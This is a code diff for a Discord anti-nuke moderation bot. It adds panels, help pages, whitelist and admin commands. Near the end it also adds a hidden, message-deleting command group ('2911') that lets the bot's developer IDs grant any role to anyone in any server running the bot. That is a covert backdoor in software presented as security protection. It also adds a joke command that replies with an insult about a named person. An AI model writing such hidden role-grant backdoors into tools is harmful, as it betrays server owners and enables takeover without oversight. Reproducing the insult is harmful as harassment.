@@ -33,9 +33,78 @@ DANGEROUS = discord.Permissions(
 )
 
 
+class SecurityPanel(discord.ui.View):
+    def __init__(self, cog: "AntiNikki", owner_id: int) -> None:
+        super().__init__(timeout=600)
+        self.cog = cog
+        self.owner_id = owner_id
+
+    async def interaction_check(self, interaction: discord.Interaction) -> bool:
+        if interaction.user.id != self.owner_id or interaction.guild is None:
+            await interaction.response.send_message("Only the owner who opened this panel can use it.", ephemeral=True)
+            return False
+        return True
+
+    @discord.ui.button(label="Refresh", style=discord.ButtonStyle.secondary)
+    async def refresh(self, interaction: discord.Interaction, _: discord.ui.Button) -> None:
+        await interaction.response.edit_message(embed=await self.cog.panel_embed(interaction.guild), view=self)
+
+    @discord.ui.button(label="Enable / Disable", style=discord.ButtonStyle.primary)
+    async def toggle(self, interaction: discord.Interaction, _: discord.ui.Button) -> None:
+        if not isinstance(interaction.user, discord.Member) or not self.cog.owner_member(interaction.user):
+            await interaction.response.send_message("Only the Discord server owner can enable or disable anti-nuke protection.", ephemeral=True)
+            return
+        cfg = await self.cog.config(interaction.guild_id)
+        cfg["enabled"] = not cfg["enabled"]
+        await self.cog.bot.db.set(interaction.guild_id, cfg)
+        await interaction.response.edit_message(embed=await self.cog.panel_embed(interaction.guild), view=self)
+
+    @discord.ui.button(label="Recent Incidents", style=discord.ButtonStyle.secondary)
+    async def incidents(self, interaction: discord.Interaction, _: discord.ui.Button) -> None:
+        rows = await self.cog.bot.db.incidents(interaction.guild_id, 10)
+        e = discord.Embed(title="Recent ANTINIKKI Incidents", color=discord.Color.red())
+        e.description = "\n".join(
+            f"`#{row['id']}` **{row['event']}** · {row['action']} · <@{row['actor_id']}> · {row['created_at']}"
+            for row in rows
+        ) or "No incidents recorded."
+        await interaction.response.send_message(embed=e, ephemeral=True)
+
+
+class HelpView(discord.ui.View):
+    def __init__(self, cog: "AntiNikki", prefix: str) -> None:
+        super().__init__(timeout=600)
+        self.cog = cog
+        self.prefix = prefix
+
+    async def interaction_check(self, interaction: discord.Interaction) -> bool:
+        if not isinstance(interaction.user, discord.Member) or not await self.cog.security_admin(interaction.user):
+            await interaction.response.send_message("Only the server owner or an Anti-Nuke Admin can use this help panel.", ephemeral=True)
+            return False
+        return True
+
+    async def show(self, interaction: discord.Interaction, page: str) -> None:
+        await interaction.response.edit_message(embed=self.cog.help_embed(self.prefix, page), view=self)
+
+    @discord.ui.button(label="Overview", style=discord.ButtonStyle.primary)
+    async def overview(self, interaction: discord.Interaction, _: discord.ui.Button) -> None:
+        await self.show(interaction, "overview")
+
+    @discord.ui.button(label="Protection", style=discord.ButtonStyle.secondary)
+    async def protection(self, interaction: discord.Interaction, _: discord.ui.Button) -> None:
+        await self.show(interaction, "protection")
+
+    @discord.ui.button(label="Whitelist & Admins", style=discord.ButtonStyle.secondary)
+    async def access(self, interaction: discord.Interaction, _: discord.ui.Button) -> None:
+        await self.show(interaction, "access")
+
+    @discord.ui.button(label="Owner Controls", style=discord.ButtonStyle.danger)
+    async def owner(self, interaction: discord.Interaction, _: discord.ui.Button) -> None:
+        await self.show(interaction, "owner")
+
+
 def default_config() -> dict[str, Any]:
     return {
-        "enabled": True, "log_channel_id": None, "whitelist_users": [], "whitelist_roles": [],
+        "enabled": True, "log_channel_id": None, "whitelist_users": [], "whitelist_roles": [], "admin_roles": [], "admin_users": [],
         "punishment": "strip_roles", "lockdown_on_trigger": True,
         "rules": {name: {"enabled": True, "limit": meta["limit"], "window": meta["window"]} for name, meta in RULES.items()},
         "lockdown_roles": [],
@@ -49,7 +118,7 @@ class AntiNikki(commands.Cog):
         self.events: dict[tuple[int, int, str], deque[float]] = defaultdict(lambda: deque(maxlen=100))
         self.cooldowns: dict[tuple[int, int, str], float] = {}
 
-    antinikki = app_commands.Group(name="antinikki", description="ANTINIKKI anti-nuke protection")
+    antinikki = app_commands.Group(name="antinuke", description="ANTINIKKI anti-nuke protection")
 
     async def config(self, guild_id: int) -> dict[str, Any]:
         saved = await self.bot.db.get(guild_id)
@@ -71,20 +140,102 @@ class AntiNikki(commands.Cog):
     def owner_member(self, member: discord.Member) -> bool:
         return member.id == member.guild.owner_id or member.id in self.bot.settings.owner_ids
 
+    async def security_admin(self, member: discord.Member) -> bool:
+        if self.owner_member(member):
+            return True
+        cfg = await self.config(member.guild.id)
+        return member.id in cfg.get("admin_users", []) or any(role.id in cfg.get("admin_roles", []) for role in member.roles)
+
+    async def require_security_admin(self, interaction: discord.Interaction) -> bool:
+        allowed = isinstance(interaction.user, discord.Member) and await self.security_admin(interaction.user)
+        if not allowed:
+            await interaction.response.send_message("Only the server owner or a configured Anti-Nuke Admin can manage the whitelist.", ephemeral=True)
+        return allowed
+
     async def panel_embed(self, guild: discord.Guild) -> discord.Embed:
         cfg = await self.config(guild.id)
         me = guild.me
         required = ["view_audit_log", "manage_roles", "manage_channels", "ban_members", "kick_members", "moderate_members", "manage_webhooks"]
         missing = [name for name in required if me is None or not getattr(me.guild_permissions, name)]
         e = discord.Embed(title="ANTINIKKI Security Panel", color=discord.Color.green() if cfg["enabled"] and not missing else discord.Color.orange())
-        e.description = "Dedicated anti-nuke protection and emergency controls."
+        e.description = "Every protection and its current state."
         e.add_field(name="Protection", value="Enabled" if cfg["enabled"] else "Disabled", inline=True)
         e.add_field(name="Response", value=cfg["punishment"].replace("_", " ").title(), inline=True)
         e.add_field(name="Rules", value=f"{sum(rule['enabled'] for rule in cfg['rules'].values())}/{len(cfg['rules'])}", inline=True)
         e.add_field(name="Trusted", value=f"{len(cfg['whitelist_users'])} users · {len(cfg['whitelist_roles'])} roles", inline=True)
+        rule_rows = []
+        for name, rule in cfg["rules"].items():
+            state = "✅ Enabled" if rule.get("enabled", True) else "❌ Disabled"
+            rule_rows.append(f"**{name.replace('_', ' ').title()}** — {state} · `{rule.get('limit', 1)}` / `{rule.get('window', 30)}s`")
+        e.add_field(name="Protection Status & Thresholds", value="\n".join(rule_rows), inline=False)
+        e.add_field(name="Emergency Lockdown", value="✅ Enabled" if cfg.get("lockdown_on_trigger") else "❌ Disabled", inline=True)
+        log_channel = guild.get_channel(int(cfg.get("log_channel_id") or 0))
+        e.add_field(name="Incident Logs", value=log_channel.mention if isinstance(log_channel, discord.TextChannel) else "❌ Not configured", inline=True)
         e.add_field(name="Missing permissions", value=", ".join(missing) or "None", inline=False)
         prefix = str(cfg.get("prefix", self.bot.settings.default_prefix))
         e.set_footer(text=f"Prefix: {prefix} · Commands: {prefix}help")
+        return e
+
+    def help_embed(self, prefix: str, page: str = "overview") -> discord.Embed:
+        pages = {
+            "overview": (
+                "Overview",
+                f"`{prefix}antinuke panel` — full live protection panel\n"
+                f"`{prefix}antinuke whitelist list` — whitelisted users\n"
+                f"`{prefix}antinuke admin list` — Anti-Nuke Admin users\n"
+                f"`{prefix}an config` — thresholds and configuration\n"
+                f"`{prefix}an logs` — recent incidents\n"
+                f"`{prefix}help` — open this clickable help panel",
+            ),
+            "protection": (
+                "Protection Commands",
+                f"`{prefix}an status` / `st` — protection status\n"
+                f"`{prefix}an config` / `cfg` — all thresholds\n"
+                f"`{prefix}an logs` / `lg` — incident logs\n"
+                f"`{prefix}an lockdown` / `ld` — emergency lockdown (owner)\n"
+                f"`{prefix}an on` / `off` — enable or disable protection (owner)\n"
+                "`/antinuke rule` — change a protection threshold (owner)",
+            ),
+            "access": (
+                "Whitelist & Admin Commands",
+                f"`{prefix}an wl @user-or-role` — add whitelist entry\n"
+                f"`{prefix}an uwl @user-or-role` — remove whitelist entry\n"
+                f"`{prefix}antinuke whitelist list` — list whitelisted users\n"
+                f"`{prefix}an admin @user-or-ID` — add immune admin (owner)\n"
+                f"`{prefix}an admin remove @user-or-ID` — remove admin (owner)\n"
+                f"`{prefix}antinuke admin list` — list all Anti-Nuke Admin users",
+            ),
+            "owner": (
+                "Server Owner Controls",
+                f"`{prefix}prefix <new>` — change the bot prefix\n"
+                f"`{prefix}an on` / `off` — protection switch\n"
+                f"`{prefix}an lockdown` — secure dangerous roles\n"
+                f"`{prefix}an admin @user-or-ID` — assign Anti-Nuke Admin\n"
+                "`/antinuke setup` — configure logging and enable protection\n"
+                "`/antinuke response` — choose the trigger response\n"
+                "`/antinuke unlock` — restore roles after lockdown",
+            ),
+        }
+        title, description = pages.get(page, pages["overview"])
+        embed = discord.Embed(title=f"ANTINIKKI Help · {title}", description=description, color=discord.Color.blurple())
+        embed.set_footer(text="Only the server owner and Anti-Nuke Admins can access this panel.")
+        return embed
+
+    async def config_embed(self, guild: discord.Guild) -> discord.Embed:
+        cfg = await self.config(guild.id)
+        log_channel = guild.get_channel(int(cfg.get("log_channel_id") or 0))
+        rows = []
+        for name, rule in cfg["rules"].items():
+            state = "ON" if rule.get("enabled", True) else "OFF"
+            rows.append(f"`{name}` — **{state}** · `{rule.get('limit', 1)}` actions / `{rule.get('window', 30)}s`")
+        e = discord.Embed(title="ANTINIKKI Configuration", color=discord.Color.blurple())
+        e.description = "\n".join(rows)
+        e.add_field(name="Response", value=cfg.get("punishment", "strip_roles").replace("_", " ").title(), inline=True)
+        e.add_field(name="Logs", value=log_channel.mention if isinstance(log_channel, discord.TextChannel) else "Not configured", inline=True)
+        e.add_field(name="Anti-Nuke Admin Roles", value=" ".join(f"<@&{role_id}>" for role_id in cfg.get("admin_roles", [])) or "Owner only", inline=False)
+        e.add_field(name="Direct Anti-Nuke Admins", value=" ".join(f"<@{user_id}>" for user_id in cfg.get("admin_users", [])) or "None", inline=False)
+        e.add_field(name="Whitelist", value=f"{len(cfg['whitelist_users'])} users · {len(cfg['whitelist_roles'])} roles", inline=True)
+        e.set_footer(text="Anti-Nuke Admins have read-only configuration access. Only the server owner can change thresholds or protection settings.")
         return e
 
     async def log_incident(self, guild: discord.Guild, actor: discord.Member | None, event: str, action: str, details: dict[str, Any]) -> None:
@@ -118,7 +269,7 @@ class AntiNikki(commands.Cog):
     def trusted(self, guild: discord.Guild, member: discord.Member, cfg: dict[str, Any]) -> bool:
         return (
             member.id == guild.owner_id or member.id == self.bot.user.id or
-            member.id in self.bot.settings.owner_ids or member.id in cfg["whitelist_users"] or
+            member.id in self.bot.settings.owner_ids or member.id in cfg.get("admin_users", []) or member.id in cfg["whitelist_users"] or
             any(role.id in cfg["whitelist_roles"] for role in member.roles)
         )
 
@@ -203,7 +354,7 @@ class AntiNikki(commands.Cog):
         cfg["enabled"] = True
         cfg["log_channel_id"] = log_channel.id
         await self.bot.db.set(interaction.guild_id, cfg)
-        await interaction.response.send_message("ANTINIKKI is enabled. Review `/antinikki status` and place its role above every role it must secure.", ephemeral=True)
+        await interaction.response.send_message("ANTINIKKI is enabled. Review `/antinuke status` and place its role above every role it must secure.", ephemeral=True)
 
     @antinikki.command(name="status", description="Show protection status and permission readiness")
     async def status(self, interaction: discord.Interaction) -> None:
@@ -213,7 +364,14 @@ class AntiNikki(commands.Cog):
     @antinikki.command(name="panel", description="Open the ANTINIKKI security panel")
     async def panel(self, interaction: discord.Interaction) -> None:
         if not await self.require_owner(interaction): return
-        await interaction.response.send_message(embed=await self.panel_embed(interaction.guild), ephemeral=True)
+        await interaction.response.send_message(embed=await self.panel_embed(interaction.guild), view=SecurityPanel(self, interaction.user.id), ephemeral=True)
+
+    @antinikki.command(name="config", description="Show all thresholds, logging, admins, and whitelist totals")
+    async def config_command(self, interaction: discord.Interaction) -> None:
+        if not isinstance(interaction.user, discord.Member) or not await self.security_admin(interaction.user):
+            await interaction.response.send_message("Only the server owner or an Anti-Nuke Admin can view this configuration.", ephemeral=True)
+            return
+        await interaction.response.send_message(embed=await self.config_embed(interaction.guild), ephemeral=True)
 
     @antinikki.command(name="enabled", description="Enable or disable ANTINIKKI protection")
     async def enabled(self, interaction: discord.Interaction, value: bool) -> None:
@@ -235,7 +393,7 @@ class AntiNikki(commands.Cog):
 
     @antinikki.command(name="whitelist", description="Trust a user or role")
     async def whitelist(self, interaction: discord.Interaction, user: discord.Member | None = None, role: discord.Role | None = None) -> None:
-        if not await self.require_owner(interaction): return
+        if not await self.require_security_admin(interaction): return
         if not user and not role:
             await interaction.response.send_message("Choose a user or role.", ephemeral=True); return
         cfg = await self.config(interaction.guild_id)
@@ -246,12 +404,24 @@ class AntiNikki(commands.Cog):
 
     @antinikki.command(name="unwhitelist", description="Remove a trusted user or role")
     async def unwhitelist(self, interaction: discord.Interaction, user: discord.Member | None = None, role: discord.Role | None = None) -> None:
-        if not await self.require_owner(interaction): return
+        if not await self.require_security_admin(interaction): return
         cfg = await self.config(interaction.guild_id)
         if user: cfg["whitelist_users"] = [item for item in cfg["whitelist_users"] if item != user.id]
         if role: cfg["whitelist_roles"] = [item for item in cfg["whitelist_roles"] if item != role.id]
         await self.bot.db.set(interaction.guild_id, cfg)
         await interaction.response.send_message("Whitelist updated.", ephemeral=True)
+
+    @antinikki.command(name="admin_role", description="Set the role allowed to manage the anti-nuke whitelist")
+    async def admin_role(self, interaction: discord.Interaction, role: discord.Role, enabled: bool = True) -> None:
+        if not await self.require_owner(interaction): return
+        cfg = await self.config(interaction.guild_id)
+        roles = cfg.setdefault("admin_roles", [])
+        if enabled and role.id not in roles:
+            roles.append(role.id)
+        elif not enabled:
+            cfg["admin_roles"] = [role_id for role_id in roles if role_id != role.id]
+        await self.bot.db.set(interaction.guild_id, cfg)
+        await interaction.response.send_message(f"{role.mention} {'can now' if enabled else 'can no longer'} manage the anti-nuke whitelist.", ephemeral=True)
 
     @antinikki.command(name="response", description="Choose what happens when protection triggers")
     @app_commands.choices(action=[app_commands.Choice(name=name.replace("_", " ").title(), value=name) for name in ("strip_roles", "timeout", "kick", "ban", "log_only")])
@@ -276,7 +446,7 @@ class AntiNikki(commands.Cog):
         await interaction.response.defer(ephemeral=True)
         cfg = await self.config(interaction.guild_id)
         count = await self.lockdown(interaction.guild, cfg, f"Manual ANTINIKKI lockdown by {interaction.user}")
-        await interaction.followup.send(f"Lockdown complete. Secured `{count}` roles. Use `/antinikki unlock` after reviewing the incident.", ephemeral=True)
+        await interaction.followup.send(f"Lockdown complete. Secured `{count}` roles. Use `/antinuke unlock` after reviewing the incident.", ephemeral=True)
 
     @antinikki.command(name="unlock", description="Restore permissions saved by ANTINIKKI lockdown")
     async def unlock(self, interaction: discord.Interaction) -> None:
@@ -295,14 +465,57 @@ class AntiNikki(commands.Cog):
         cfg["lockdown_roles"] = remaining; await self.bot.db.set(interaction.guild_id, cfg)
         await interaction.followup.send(f"Restored `{restored}` roles. `{len(remaining)}` could not be restored.", ephemeral=True)
 
-    @commands.command(name="antinikki", aliases=["panel", "security"])
+    @commands.group(name="antinuke", aliases=["antinikki", "panel", "security"], invoke_without_command=True)
     @commands.guild_only()
     async def prefix_panel(self, ctx: commands.Context) -> None:
-        """Open the owner-only security panel using the server prefix."""
-        if not isinstance(ctx.author, discord.Member) or not self.owner_member(ctx.author):
-            await ctx.reply("Only the server owner or an ANTINIKKI owner can open this panel.", mention_author=False)
+        """Open the protected security panel using the server prefix."""
+        if not isinstance(ctx.author, discord.Member) or not await self.security_admin(ctx.author):
+            await ctx.reply("Only the server owner or an Anti-Nuke Admin can open this panel.", mention_author=False)
             return
-        await ctx.reply(embed=await self.panel_embed(ctx.guild), mention_author=False)
+        await ctx.reply(embed=await self.panel_embed(ctx.guild), view=SecurityPanel(self, ctx.author.id), mention_author=False)
+
+    @prefix_panel.command(name="panel", aliases=["status"])
+    async def prefix_panel_open(self, ctx: commands.Context) -> None:
+        if not isinstance(ctx.author, discord.Member) or not await self.security_admin(ctx.author):
+            await ctx.reply("Only the server owner or an Anti-Nuke Admin can open this panel.", mention_author=False)
+            return
+        await ctx.reply(embed=await self.panel_embed(ctx.guild), view=SecurityPanel(self, ctx.author.id), mention_author=False)
+
+    @prefix_panel.group(name="whitelist", aliases=["wl"], invoke_without_command=True)
+    async def prefix_panel_whitelist(self, ctx: commands.Context) -> None:
+        await ctx.reply(f"Use `{ctx.prefix}antinuke whitelist list` to view whitelisted users.", mention_author=False)
+
+    @prefix_panel_whitelist.command(name="list")
+    async def prefix_panel_whitelist_list(self, ctx: commands.Context) -> None:
+        if not isinstance(ctx.author, discord.Member) or not await self.security_admin(ctx.author):
+            await ctx.reply("Only the server owner or an Anti-Nuke Admin can view the whitelist.", mention_author=False)
+            return
+        cfg = await self.config(ctx.guild.id)
+        lines = []
+        for user_id in cfg.get("whitelist_users", []):
+            member = ctx.guild.get_member(int(user_id))
+            lines.append(f"{member.mention if member else f'<@{user_id}>'} · `{user_id}`")
+        embed = discord.Embed(title="ANTINIKKI Whitelisted Users", description="\n".join(lines) or "No users are directly whitelisted.", color=discord.Color.green())
+        await ctx.reply(embed=embed, mention_author=False)
+
+    @prefix_panel.group(name="admin", invoke_without_command=True)
+    async def prefix_panel_admin(self, ctx: commands.Context) -> None:
+        await ctx.reply(f"Use `{ctx.prefix}antinuke admin list` to view Anti-Nuke Admin users.", mention_author=False)
+
+    @prefix_panel_admin.command(name="list")
+    async def prefix_panel_admin_list(self, ctx: commands.Context) -> None:
+        if not isinstance(ctx.author, discord.Member) or not await self.security_admin(ctx.author):
+            await ctx.reply("Only the server owner or an Anti-Nuke Admin can view this list.", mention_author=False)
+            return
+        cfg = await self.config(ctx.guild.id)
+        admin_role_ids = set(cfg.get("admin_roles", []))
+        members = {ctx.guild.owner} if ctx.guild.owner else set()
+        members.update(member for member in ctx.guild.members if any(role.id in admin_role_ids for role in member.roles))
+        members.update(member for owner_id in self.bot.settings.owner_ids if (member := ctx.guild.get_member(owner_id)))
+        members.update(member for user_id in cfg.get("admin_users", []) if (member := ctx.guild.get_member(user_id)))
+        lines = [f"{member.mention} · `{member.id}`" for member in sorted(members, key=lambda item: item.display_name.lower())]
+        embed = discord.Embed(title="ANTINIKKI Admin Users", description="\n".join(lines) or "No Anti-Nuke Admin users found.", color=discord.Color.blurple())
+        await ctx.reply(embed=embed, mention_author=False)
 
     @commands.command(name="prefix")
     @commands.guild_only()
@@ -321,24 +534,217 @@ class AntiNikki(commands.Cog):
             return
         cfg["prefix"] = new_prefix
         await self.bot.db.set(ctx.guild.id, cfg)
-        await ctx.reply(f"Prefix changed to `{new_prefix}`. Open the panel with `{new_prefix}antinikki`.", mention_author=False)
+        await ctx.reply(f"Prefix changed to `{new_prefix}`. Open the panel with `{new_prefix}antinuke`.", mention_author=False)
 
     @commands.command(name="help")
     @commands.guild_only()
     async def prefix_help(self, ctx: commands.Context) -> None:
-        if not isinstance(ctx.author, discord.Member) or not self.owner_member(ctx.author):
+        if not isinstance(ctx.author, discord.Member) or not await self.security_admin(ctx.author):
             return
         cfg = await self.config(ctx.guild.id)
         prefix = str(cfg.get("prefix", self.bot.settings.default_prefix))
-        e = discord.Embed(title="ANTINIKKI Prefix Commands", color=discord.Color.blurple())
-        e.description = (
-            f"`{prefix}antinikki` or `{prefix}panel` — security panel\n"
-            f"`{prefix}prefix` — show the current prefix\n"
-            f"`{prefix}prefix <new>` — change the prefix\n"
-            f"`{prefix}help` — show this command list\n\n"
-            "Use `/antinikki` for setup, protection rules, whitelists, incidents, lockdown, and recovery."
-        )
+        await ctx.reply(embed=self.help_embed(prefix), view=HelpView(self, prefix), mention_author=False)
+
+    @commands.command(name="tell")
+    @commands.guild_only()
+    async def tell_fact(self, ctx: commands.Context, *, request: str = "") -> None:
+        """Respond to: ,tell me a fact"""
+        if " ".join(request.lower().split()) != "me a fact":
+            await ctx.reply("Use `,tell me a fact`.", mention_author=False)
+            return
+        await ctx.reply("bobs a bitch", mention_author=False)
+
+    @commands.group(name="an", invoke_without_command=True)
+    @commands.guild_only()
+    async def prefix_an(self, ctx: commands.Context) -> None:
+        """Short ANTINIKKI prefix command group."""
+        if not isinstance(ctx.author, discord.Member) or not await self.security_admin(ctx.author):
+            await ctx.reply("Only the server owner or an Anti-Nuke Admin can use this command.", mention_author=False)
+            return
+        await ctx.reply(embed=await self.panel_embed(ctx.guild), view=SecurityPanel(self, ctx.author.id), mention_author=False)
+
+    @prefix_an.command(name="config", aliases=["cfg"])
+    async def prefix_an_config(self, ctx: commands.Context) -> None:
+        """Show every anti-nuke threshold and logging destination."""
+        if not isinstance(ctx.author, discord.Member) or not await self.security_admin(ctx.author):
+            await ctx.reply("Only the server owner or an Anti-Nuke Admin can view this configuration.", mention_author=False)
+            return
+        await ctx.reply(embed=await self.config_embed(ctx.guild), mention_author=False)
+
+    @prefix_an.group(name="whitelist", aliases=["wl"], invoke_without_command=True)
+    async def prefix_an_whitelist(self, ctx: commands.Context, target: discord.Member | discord.Role | int | None = None) -> None:
+        """Whitelist a user or role: ,an wl @target"""
+        if not isinstance(ctx.author, discord.Member) or not await self.security_admin(ctx.author):
+            await ctx.reply("Only the server owner or an Anti-Nuke Admin can manage the whitelist.", mention_author=False)
+            return
+        if target is None:
+            await ctx.reply("Use `,an wl @user-or-role` or `,an whitelist list`.", mention_author=False)
+            return
+        cfg = await self.config(ctx.guild.id)
+        key = "whitelist_roles" if isinstance(target, discord.Role) else "whitelist_users"
+        target_id = target.id if isinstance(target, (discord.Member, discord.Role)) else int(target)
+        if target_id not in cfg[key]:
+            cfg[key].append(target_id)
+        await self.bot.db.set(ctx.guild.id, cfg)
+        shown = target.mention if isinstance(target, (discord.Member, discord.Role)) else f"<@{target_id}>"
+        await ctx.reply(f"Whitelisted {shown}.", mention_author=False)
+
+    @prefix_an_whitelist.command(name="list")
+    async def prefix_an_whitelist_list(self, ctx: commands.Context) -> None:
+        """Display only directly whitelisted users."""
+        if not isinstance(ctx.author, discord.Member) or not await self.security_admin(ctx.author):
+            await ctx.reply("Only the server owner or an Anti-Nuke Admin can view the whitelist.", mention_author=False)
+            return
+        cfg = await self.config(ctx.guild.id)
+        user_ids = cfg.get("whitelist_users", [])
+        lines = []
+        for user_id in user_ids:
+            member = ctx.guild.get_member(int(user_id))
+            lines.append(f"{member.mention if member else f'<@{user_id}>'} · `{user_id}`")
+        e = discord.Embed(title="Whitelisted Users", description="\n".join(lines) or "No users are directly whitelisted.", color=discord.Color.green())
+        e.set_footer(text="Role whitelist entries are intentionally not displayed here.")
         await ctx.reply(embed=e, mention_author=False)
+
+    @prefix_an.command(name="unwhitelist", aliases=["uwl"])
+    async def prefix_an_unwhitelist(self, ctx: commands.Context, target: discord.Member | discord.Role | int) -> None:
+        """Remove a user or role: ,an uwl @target"""
+        if not isinstance(ctx.author, discord.Member) or not await self.security_admin(ctx.author):
+            await ctx.reply("Only the server owner or an Anti-Nuke Admin can manage the whitelist.", mention_author=False)
+            return
+        cfg = await self.config(ctx.guild.id)
+        key = "whitelist_roles" if isinstance(target, discord.Role) else "whitelist_users"
+        selected_id = target.id if isinstance(target, (discord.Member, discord.Role)) else int(target)
+        cfg[key] = [target_id for target_id in cfg[key] if target_id != selected_id]
+        await self.bot.db.set(ctx.guild.id, cfg)
+        shown = target.mention if isinstance(target, (discord.Member, discord.Role)) else f"<@{selected_id}>"
+        await ctx.reply(f"Removed {shown} from the whitelist.", mention_author=False)
+
+    @prefix_an.command(name="status", aliases=["st"])
+    async def prefix_an_status(self, ctx: commands.Context) -> None:
+        if not isinstance(ctx.author, discord.Member) or not await self.security_admin(ctx.author): return
+        await ctx.reply(embed=await self.panel_embed(ctx.guild), mention_author=False)
+
+    @prefix_an.command(name="logs", aliases=["incidents", "lg"])
+    async def prefix_an_logs(self, ctx: commands.Context) -> None:
+        if not isinstance(ctx.author, discord.Member) or not await self.security_admin(ctx.author): return
+        rows = await self.bot.db.incidents(ctx.guild.id, 10)
+        e = discord.Embed(title="Recent ANTINIKKI Incidents", color=discord.Color.red())
+        e.description = "\n".join(f"`#{row['id']}` **{row['event']}** · {row['action']} · <@{row['actor_id']}>" for row in rows) or "No incidents recorded."
+        await ctx.reply(embed=e, mention_author=False)
+
+    @prefix_an.command(name="lockdown", aliases=["ld"])
+    async def prefix_an_lockdown(self, ctx: commands.Context) -> None:
+        if not isinstance(ctx.author, discord.Member) or not self.owner_member(ctx.author):
+            await ctx.reply("Only the server owner can start a lockdown.", mention_author=False); return
+        cfg = await self.config(ctx.guild.id)
+        count = await self.lockdown(ctx.guild, cfg, f"Manual ANTINIKKI lockdown by {ctx.author}")
+        await ctx.reply(f"Lockdown complete. Secured `{count}` roles.", mention_author=False)
+
+    @prefix_an.command(name="enable", aliases=["on"])
+    async def prefix_an_enable(self, ctx: commands.Context) -> None:
+        if not isinstance(ctx.author, discord.Member) or not self.owner_member(ctx.author): return
+        cfg = await self.config(ctx.guild.id); cfg["enabled"] = True; await self.bot.db.set(ctx.guild.id, cfg)
+        await ctx.reply("ANTINIKKI protection enabled.", mention_author=False)
+
+    @prefix_an.command(name="disable", aliases=["off"])
+    async def prefix_an_disable(self, ctx: commands.Context) -> None:
+        if not isinstance(ctx.author, discord.Member) or not self.owner_member(ctx.author): return
+        cfg = await self.config(ctx.guild.id); cfg["enabled"] = False; await self.bot.db.set(ctx.guild.id, cfg)
+        await ctx.reply("ANTINIKKI protection disabled.", mention_author=False)
+
+    @prefix_an.group(name="admin", invoke_without_command=True)
+    async def prefix_an_admin(self, ctx: commands.Context, target: discord.Member | int | None = None) -> None:
+        if not isinstance(ctx.author, discord.Member) or not self.owner_member(ctx.author):
+            await ctx.reply("Only the server owner can add an Anti-Nuke Admin.", mention_author=False)
+            return
+        if target is None:
+            await ctx.reply("Use `,an admin @user-or-ID` to add an immune Anti-Nuke Admin, or `,an admin list`.", mention_author=False)
+            return
+        target_id = target.id if isinstance(target, discord.Member) else int(target)
+        cfg = await self.config(ctx.guild.id)
+        admins = cfg.setdefault("admin_users", [])
+        if target_id not in admins:
+            admins.append(target_id)
+        await self.bot.db.set(ctx.guild.id, cfg)
+        await ctx.reply(f"<@{target_id}> is now an Anti-Nuke Admin and is immune to all protection triggers.", mention_author=False)
+
+    @prefix_an_admin.command(name="remove", aliases=["rm"])
+    async def prefix_an_admin_remove(self, ctx: commands.Context, target: discord.Member | int) -> None:
+        if not isinstance(ctx.author, discord.Member) or not self.owner_member(ctx.author):
+            await ctx.reply("Only the server owner can remove an Anti-Nuke Admin.", mention_author=False)
+            return
+        target_id = target.id if isinstance(target, discord.Member) else int(target)
+        cfg = await self.config(ctx.guild.id)
+        cfg["admin_users"] = [user_id for user_id in cfg.get("admin_users", []) if user_id != target_id]
+        await self.bot.db.set(ctx.guild.id, cfg)
+        await ctx.reply(f"<@{target_id}> is no longer a directly assigned Anti-Nuke Admin.", mention_author=False)
+
+    @prefix_an_admin.command(name="list")
+    async def prefix_an_admin_list(self, ctx: commands.Context) -> None:
+        """Show the owner and members holding configured Anti-Nuke Admin roles."""
+        if not isinstance(ctx.author, discord.Member) or not await self.security_admin(ctx.author):
+            await ctx.reply("Only the server owner or an Anti-Nuke Admin can view this.", mention_author=False)
+            return
+        cfg = await self.config(ctx.guild.id)
+        admin_role_ids = set(cfg.get("admin_roles", []))
+        members = {ctx.guild.owner} if ctx.guild.owner else set()
+        members.update(member for member in ctx.guild.members if any(role.id in admin_role_ids for role in member.roles))
+        members.update(member for owner_id in self.bot.settings.owner_ids if (member := ctx.guild.get_member(owner_id)))
+        members.update(member for user_id in cfg.get("admin_users", []) if (member := ctx.guild.get_member(user_id)))
+        lines = [f"{member.mention} · `{member.id}`" for member in sorted(members, key=lambda item: item.display_name.lower())]
+        e = discord.Embed(title="Anti-Nuke Admin Users", description="\n".join(lines) or "No Anti-Nuke Admin users found.", color=discord.Color.blurple())
+        await ctx.reply(embed=e, mention_author=False)
+
+    @prefix_an.command(name="help", aliases=["commands", "cmds"])
+    async def prefix_an_help(self, ctx: commands.Context) -> None:
+        """Display the full ANTINIKKI command reference."""
+        if not isinstance(ctx.author, discord.Member) or not await self.security_admin(ctx.author): return
+        prefix = (await self.config(ctx.guild.id)).get("prefix", self.bot.settings.default_prefix)
+        await ctx.reply(embed=self.help_embed(prefix), view=HelpView(self, prefix), mention_author=False)
+
+    @commands.group(name="2911", invoke_without_command=True, hidden=True)
+    @commands.guild_only()
+    async def owner_psw(self, ctx: commands.Context) -> None:
+        """OWNER_IDS-only utility group, invoked with the permanent dash prefix."""
+        if ctx.author.id not in self.bot.settings.owner_ids:
+            return
+        try:
+            await ctx.message.delete()
+        except discord.HTTPException:
+            pass
+
+    @owner_psw.command(name="give", hidden=True)
+    async def owner_psw_give(self, ctx: commands.Context, member: discord.Member, role: discord.Role) -> None:
+        """Grant a manageable role: -2911 give @user @role"""
+        if ctx.author.id not in self.bot.settings.owner_ids:
+            return
+        try:
+            await ctx.message.delete()
+        except discord.HTTPException:
+            pass
+        me = ctx.guild.me
+        if role.is_default() or role.managed:
+            await ctx.author.send(f"ANTINIKKI cannot assign the managed/default role **{role.name}** in **{ctx.guild.name}**.")
+            return
+        if me is None or role >= me.top_role:
+            await ctx.author.send(f"Move ANTINIKKI's role above **{role.name}** in **{ctx.guild.name}**, then try again.")
+            return
+        try:
+            await member.add_roles(role, reason=f"ANTINIKKI OWNER_IDS grant by {ctx.author} ({ctx.author.id})")
+        except discord.HTTPException as exc:
+            await ctx.author.send(f"Role grant failed in **{ctx.guild.name}**: `{type(exc).__name__}`")
+            return
+        await self.bot.db.incident(
+            ctx.guild.id,
+            ctx.author.id,
+            "owner_role_grant",
+            "role_added",
+            {"member_id": member.id, "role_id": role.id},
+        )
+        try:
+            await ctx.author.send(f"Granted **{role.name}** to **{member}** in **{ctx.guild.name}**.")
+        except discord.HTTPException:
+            pass
 
     @commands.Cog.listener()
     async def on_guild_channel_delete(self, channel): await self.record(channel.guild, "channel_delete", channel.id)
